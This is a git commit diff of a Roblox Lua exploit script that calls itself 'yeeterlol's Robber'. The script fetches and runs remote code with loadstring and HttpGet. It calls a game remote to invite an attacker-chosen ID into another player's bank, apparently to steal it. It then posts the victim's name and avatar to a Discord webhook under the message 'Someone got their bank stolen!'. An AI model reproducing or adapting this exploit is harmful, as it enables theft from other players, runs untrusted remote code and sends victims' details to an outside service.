dc03fa8c66ddafbadd7d86198451dce3c3e0ad2e
yeeterlol <81702700+yeeterlol@users.noreply.github.com>
2022-02-10 12:33:57 -0800

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,7 +1,6 @@
 -- SimpleSpy API 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
 
-
 -- The ID that will get invited to the bank
 local id = 1
 -- Discord webhook
@@ -22,6 +21,7 @@ local Invite = {
 }
 
 workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(Invite))
+
 if webhook == true then
     local Content = 'Someone got their bank stolen!'
     local Embed = {
@@ -33,12 +33,15 @@ if webhook == true then
 		        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
 		    },
     }
+	
     (syn and syn.request or http_request or http.request) {
-        Url = link; -- Put in your webgh
+        Url = link;
         Method = 'POST';
         Headers = {
             ['Content-Type'] = 'application/json';
         };
         Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}});
     };
+else
+	print("[yeeterlol's Robber]: No Webhook detected, continuing...")
 end
